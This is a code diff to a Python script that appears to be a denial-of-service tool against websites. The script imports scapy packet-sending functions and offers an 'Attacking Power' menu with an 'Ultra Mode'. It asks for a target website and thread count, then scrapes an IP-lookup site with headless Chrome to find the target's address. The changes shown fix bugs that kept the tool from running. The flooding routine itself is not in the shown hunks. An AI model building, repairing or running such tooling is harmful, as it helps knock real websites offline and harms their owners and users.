@@ -1,7 +1,7 @@
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from scapy.all import IP, TCP, send
-import os, threading, requests, random
+import os, threading, requests, random, time
 from selenium import webdriver
 from colorama import *
 from os import system
@@ -71,15 +71,16 @@ f = Fore.RED+"""
 #+#+# #+#+#  #+#    #+# #+#    #+# #+#        #+#   #+#       
 ###   ###   #########   ########  ########## ###    ###
 """
-banner = random.choice(a,b,c,d,e,f)
+options = [a, b, c, d, e, f]
+banner = random.choice(options)
 print(banner)
 
-guc = input(f"""\n
+guc = int(input(f"""\n
     {Fore.GREEN}Attacking Power:
         {Fore.BLUE}1: Easy Mode
         {Fore.GREEN}2: Normal Mode
         {Fore.LIGHTBLACK_EX}3: Ultra Mode{Fore.RED}(Extreme)
-        {Fore.GREEN}Selection(1/2/3): """)
+        {Fore.GREEN}Selection(1/2/3): """))
 system('cls||clear')
 url = input(Fore.GREEN+"WebSite: "+Fore.RESET)
 thread_c = int(input(Fore.GREEN+'Thread Count: '+Fore.RESET))
@@ -97,6 +98,7 @@ opt = Options()
 opt.add_argument('--headless')
 driver = webdriver.Chrome(options=opt)
 driver.get(f'https://www.ipsorgu.com/site_ip_adresi_sorgulama.php?site={url}#sorgu')
+time.sleep(6)
 target_ip = driver.find_element(By.XPATH, '/html/body/table/tbody/tr/td/table/tbody/tr[5]/td/div/p[5]/span[3]').text
 if "https://" in url:
     target_port = 80
